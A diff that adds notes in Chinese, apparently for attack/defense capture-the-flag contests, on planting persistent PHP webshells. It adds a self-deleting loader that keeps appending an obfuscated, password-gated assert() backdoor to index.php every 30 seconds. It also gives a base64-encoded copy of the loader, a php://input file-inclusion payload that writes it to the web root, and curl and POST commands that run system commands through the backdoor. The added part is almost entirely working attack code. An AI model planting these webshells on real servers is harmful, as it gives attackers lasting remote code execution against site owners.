@@ -75,7 +75,48 @@ POST:ipaddr=/tmp %26%26 cat /flag.txt
 
 ## 常规漏洞写不死马
 
+```
+<?php
+unlink($_SERVER['SCRIPT_FILENAME']);
+ignore_user_abort(true);
+set_time_limit(0);
+$code=base64_decode("ZmlsZV9wdXRfY29udGVudHMoJ2luZGV4LnBocCcsJzw/cGhwICRhPSJhIi4icyIuInNlIi4icnQiO2lmIChtZDUoJF9QT1NUWzJdKT09PSIxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZSIpeyRhKCRfUE9TVFsxXSk7fT8+JyxGSUxFX0FQUEVORCk7");
+/*
+file_put_contents('index.php','<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>',FILE_APPEND);
+*/
+while(1){
+  @eval($code);
+  sleep(30); 
+};
+?>
+```
+加密：
+```
+PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn07Cj8+
+```
+不死马加入到index.php的一句话木马：
 
+```
+//v5est0r
+<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>
+POST: 2=v5est0r&1=system("ls -al")
+```
+
+
+##### 文件包含写不死
+
+http://172.16.2.234:8011/include.php?filename=php://input
+
+POST：
+```
+<?php file_put_contents("/var/www/html/s1.php",base64_decode("PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn07Cj8+"));?>
+```
+
+然后访问根目录s1.php， http://172.16.2.234:8011/s1.php 即可追加一句话木马到index.php，循环往复。
+
+```
+curl http://172.16.2.234:8011/index.php --data "2=v5est0r&1=system('ls -al')"
+```
 
 
 ### 对抗不死马
